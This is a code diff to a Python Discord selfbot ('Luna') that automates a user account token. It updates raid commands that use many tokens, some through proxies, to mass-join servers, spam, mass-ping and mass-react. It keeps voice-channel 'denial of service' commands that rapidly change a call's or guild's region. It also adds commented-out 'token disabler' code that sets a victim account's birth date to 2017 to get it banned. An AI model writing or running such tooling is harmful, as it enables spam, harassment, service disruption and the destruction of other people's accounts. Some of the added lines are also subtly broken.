@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 
 from ast import alias
+from cmath import e
 import os
 import re
 import sys
@@ -3519,7 +3520,7 @@ class OnMessage(commands.Cog, name="on message"):
 										embed_dict = embed.to_dict()
 										code = re.findall(r"\w[a-z]*\W*\w[a-z]+\.\w[g]*\W\S*", str(embed_dict['description']))[0].replace(")", "").replace("https://discord.gg/", "")
 										async with httpx.AsyncClient() as client:
-											await client.post(f'https://canary.discord.com/api/v8/invites/{code}', headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
+											await client.post(f'https://discord.com/api/v9/invites/{code}', headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
 											joined_server = f'discord.gg/{code}'
 											await asyncio.sleep(5)
 								except Exception:
@@ -3607,25 +3608,10 @@ class OnMessage(commands.Cog, name="on message"):
 
 		if share == "on":
 			if message.author.id == user_id:
-				if f"{prefix}help" in message.content.lower():
-					prints.shared("help")
-					if configs.mode() == 2:
-						sent = await message.channel.send(f"```ini\n[ {theme.title()} ]\n\n{theme.description()}Coming soon\n\n[ {theme.footer()} ]```")
-						await asyncio.sleep(configs.delete_timer())
-						await sent.delete()
-					if configs.mode() == 3:
-						sent = await message.channel.send(f"```ini\n[ {theme.title()} ]\n\n{theme.description()}Coming soon\n\n[ {theme.footer()} ]```")
-						await asyncio.sleep(configs.delete_timer())
-						await sent.delete()
-					else:
-						embed = discord.Embed(title=theme.title(), url=theme.title_url(), description=f"{theme.description()}```\nComing soon```", color=theme.hex_color())
-						embed.set_thumbnail(url=theme.image_url())
-						embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-						embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-						embed.set_image(url=theme.large_image_url())
-						sent = await message.channel.send(embed=embed)
-						await asyncio.sleep(configs.delete_timer())
-						await sent.delete()
+				if message.content.startswith(prefix):
+					await message.delete()
+					await message.channel.send(message.content)
+					prints.shared(message.content)
 			else:
 				pass
 
@@ -4554,7 +4540,13 @@ class HelpCog(commands.Cog, name="Help commands"):
 		helptext = ""
 		for command in commands:
 			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-		await message_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nTheme             » {themesvar}\nConsole Mode      » {console_mode}\nRiskmode          » {riskmode}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {themesvar}\nFooter            » {footer}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")
+		share = configs.share()
+		user_id = configs.share_id()
+		if user_id == "":
+			sharinguser = "None"
+		else:
+			sharinguser = await self.bot.fetch_user(user_id)
+		await message_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nTheme             » {themesvar}\nConsole Mode      » {console_mode}\nRiskmode          » {riskmode}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {themesvar}\nFooter            » {footer}\nAuthor            » {author}\n``````\nShare Settings\n\nShare             » {share}\nUser              » {sharinguser}``````\nSettings\n\n{helptext}```")
 
 	@commands.command(name = "sharing",
 					usage="",
@@ -8518,7 +8510,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
 				embed.set_image(url=theme.large_image_url())
 				await send(luna, embed)
 			else:
-				await luna.channel.purge(limit=amount, before=luna.message)
+				await luna.channel.purge(limit=amount, before=luna.message, check=is_me)
 		except:
 			try:
 				await asyncio.sleep(1)
@@ -9304,7 +9296,7 @@ class ExploitCog(commands.Cog, name="Exploit commands"):
 			requests.patch(url=f"https://discord.com/api/v9/channels/{str(channel.id)}/call", headers=headers, json={'region':random.choice(region)})
 			await asyncio.sleep(0.5)
 
-		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```", delete_after=3)
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```")
 
 	@commands.command(name = "dosvc2",
 					usage="[amount]",
@@ -9319,7 +9311,44 @@ class ExploitCog(commands.Cog, name="Exploit commands"):
 			requests.patch(f'https://discord.com/api/v9/guilds/{str(luna.guild.id)}', headers={'Authorization': user_token}, json={'region': random.choice(region)})
 			await asyncio.sleep(0.5)
 
-		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```", delete_after=3)
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```")
+
+	# @commands.command(name = "disabler",
+	# 				usage="<token>",
+	# 				aliases=["disabler1"],
+	# 				description = "Token disabler")
+	# async def disabler(self, luna, token:str):
+	# 	await luna.message.delete()
+
+	# 	await message_builder(luna, title="Token Disabler", description=f"```\nAttempting to disable the token...```", delete_after=3)
+	# 	res = requests.patch('https://discordapp.com/api/v9/guilds', headers={'Authorization': token}, json={'name': 'Luna Disabler'})
+	# 	await message_builder(luna, title="Token Disabler", description=f"```\n{res}``````json\nJSON\n\n{res.json()}```")
+
+	# @commands.command(name = "disabler2",
+	# 				usage="<token>",
+	# 				description = "Token disabler")
+	# async def disabler2(self, luna, token:str):
+	# 	await luna.message.delete()
+
+	# 	await message_builder(luna, title="Token Disabler", description=f"```\nAttempting to disable the token...```", delete_after=3)
+
+	# 	DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
+	# 	IMMUNE_MESSAGE = "You cannot update your date of birth."
+	# 	res = requests.patch('https://discordapp.com/api/v9/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2017-2-11'})
+
+	# 	if res.status_code == 400:
+	# 		res_message = res.json().get('date_of_birth', ['no response message'])[0]
+			
+	# 		if res_message == DISABLED_MESSAGE:
+	# 			await message_builder(luna, title="Token Disabler", description=f"```\nDisabled the token```")
+
+	# 		elif res_message == IMMUNE_MESSAGE:
+	# 			await message_builder(luna, title="Token Disabler", description=f"```\nThe provided token cannot be disabled```")
+
+	# 		else:
+	# 			await error_builder(luna, description=f"```\n{res_message}```")
+	# 	else:
+	# 		await error_builder(luna, description=f"```\nFailed to disable token```")
 
 bot.add_cog(ExploitCog(bot))
 class AbuseCog(commands.Cog, name="Abusive commands"):
@@ -9451,7 +9480,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.post(f'https://canary.discord.com/api/v8/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+						await client.post(f'https://discord.com/api/v9/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 						prints.event(f"{_token} joined {invitelink}")
 				except Exception:
 					prints.error(f"{_token} failed to join {invitelink}")
@@ -9480,7 +9509,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.post(f'https://canary.discord.com/api/v8/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
+						await client.post(f'https://discord.com/api/v9/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
 						prints.event(f"[PROXY] {_token} joined {invitelink}")
 				except Exception:
 					prints.error(f"[PROXY] {_token} failed to join {invitelink}")
@@ -9502,7 +9531,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				try:
 					async with httpx.AsyncClient() as client:
 						for i in range(0, amount):
-							await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+							await client.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 							prints.event(f"{_token} sent {message}")
 				except Exception:
 					prints.error(f"{_token} failed to send {message}")
@@ -9533,7 +9562,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				try:
 					async with httpx.AsyncClient() as client:
 						for i in range(0, amount):
-							await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
+							await client.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
 							prints.event(f"{_token} sent {message}")
 				except Exception:
 					prints.error(f"{_token} failed to send {message}")
@@ -9570,7 +9599,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 						try:
 							async with httpx.AsyncClient() as client:
 								for i in range(0, amount):
-									await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+									await client.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 									prints.event(f"{_token} masspinged")
 						except Exception:
 							prints.error(f"{_token} failed to massping")
@@ -9619,7 +9648,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 						try:
 							async with httpx.AsyncClient() as client:
 								for i in range(0, amount):
-									await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+									await client.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 									prints.event(f"{_token} masspinged")
 						except Exception:
 							prints.error(f"{_token} failed to massping")
@@ -9652,7 +9681,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+						await client.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 						prints.event(f"{_token} left {server_id}")
 				except Exception:
 					prints.error(f"{_token} failed to leave {server_id}")
@@ -9681,7 +9710,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
+						await client.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
 						prints.event(f"[PROXY] {_token} left {server_id}")
 				except Exception:
 					prints.error(f"[PROXY] {_token} failed to leave {server_id}")
@@ -9701,7 +9730,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
+						await client.put(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
 						prints.event(f"{_token} reacted on {message_id}")
 				except Exception:
 					prints.error(f"{_token} failed to react on {message_id}")
@@ -9729,7 +9758,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
 				_token = _token[0]
 				try:
 					async with httpx.AsyncClient() as client:
-						await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
+						await client.put(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
 						prints.event(f"{_token} reacted on {message_id}")
 				except Exception:
 					prints.error(f"{_token} failed to react on {message_id}")
@@ -10816,6 +10845,22 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		# await message_builder(ctx, description=f"```\nReloaded custom commands```")
 		await message_builder(ctx, description=f"```\nReload has been disabled until further notice, use {prefix}restart instead```")
 
+	@commands.command(name = "darkmode",
+					usage="",
+					description = "Discord darkmode")
+	async def darkmode(self, luna):
+		await luna.message.delete()
+		await requests.patch('https://discordapp.com/api/v9/users/@me/settings', json={'theme': "dark"}, headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
+		await message_builder(luna, description=f"```\nChanged to darkmode```")
+
+	@commands.command(name = "lightmode",
+					usage="",
+					description = "Discord lightmode")
+	async def lightmode(self, luna):
+		await luna.message.delete()
+		await requests.patch('https://discordapp.com/api/v9/users/@me/settings', json={'theme': "light"}, headers={'authorization': user_token, 'user-agent': 'Mozilla/5.0'})
+		await message_builder(luna, description=f"```\nChanged to lightmode```")
+
 bot.add_cog(SettingsCog(bot))
 class CustomCog(commands.Cog, name="Custom commands"):
 	def __init__(self, bot:commands.bot):
@@ -10896,7 +10941,6 @@ class ShareCog(commands.Cog, name="Share commands"):
         await message_builder(luna, description=f"```\nShare user set to » None```")
 
 bot.add_cog(ShareCog(bot))
-
 class EncodeCog(commands.Cog, name="Encode commands"):
 	def __init__(self, bot:commands.bot):
 		self.bot = bot
@@ -13272,8 +13316,9 @@ def convert_to_text(embed: discord.Embed):
 	Returns:
 		[type]: [description]
 	"""
-	for ch in ['[0m', '[1m', '[4m', '[30m', '[31m', '[32m', '[33m', '[34m', '[35m', '[36m', '[37', 'ansi']:
-		embed.description = embed.description.replace(ch, "")
+	# for ch in ['[0m', '[1m', '[4m', '[30m', '[31m', '[32m', '[33m', '[34m', '[35m', '[36m', '[37', 'ansi']:
+	# 	embed.description = embed.description.replace(ch, "")
+	embed.description = embed.description.replace('[', '[34m[').replace(']', '][0m').replace('<', '[35m<').replace('>', '>[0m').replace('»', '[37m»[0m').replace('```ansi\n', '```\n').replace(get_prefix(), f'[35m{get_prefix()}[0m')
 	largeimagevar = theme.large_image_url()
 	if embed.image.url == "":
 		if not embed.description.startswith("\n"):
@@ -13282,7 +13327,7 @@ def convert_to_text(embed: discord.Embed):
 			extra_start = ""
 		if embed.description.endswith("\n```"):
 			embed.description = embed.description[:-5]
-		text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n{extra_start}{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
+		text_mode_builder = f"```ansi\n[ {embed.title.replace('**', '')} ]\n{extra_start}{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
 		return text_mode_builder
 
 	elif embed.image.url == largeimagevar:
@@ -13293,7 +13338,7 @@ def convert_to_text(embed: discord.Embed):
 			extra_start = ""
 		if embed.description.endswith("\n```"):
 			embed.description = embed.description[:-5]
-		text_mode_builder = f"```ini\n[ {embed.title.replace('**', '')} ]\n{extra_start}{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
+		text_mode_builder = f"```ansi\n[ {embed.title.replace('**', '')} ]\n{extra_start}{embed.description.replace('```', '')}\n\n[ {embed.footer.text} ]\n```"
 		return text_mode_builder
 	else:
 		return embed.image.url
@@ -13307,7 +13352,7 @@ def convert_to_indent(embed: discord.Embed):
 	Returns:
 		[type]: [description]
 	"""
-	embed.description = embed.description.replace('[', '[34m[').replace(']', '][0m').replace('<', '[35m<').replace('>', '>[0m').replace('»', '[37m»[0m').replace('```\n', '```ansi\n')
+	embed.description = embed.description.replace('[', '[34m[').replace(']', '][0m').replace('<', '[35m<').replace('>', '>[0m').replace('»', '[37m»[0m').replace('```\n', '```ansi\n').replace(get_prefix(), f'[35m{get_prefix()}[0m')
 	largeimagevar = theme.large_image_url()
 	if embed.image.url == "":
 		text = ""
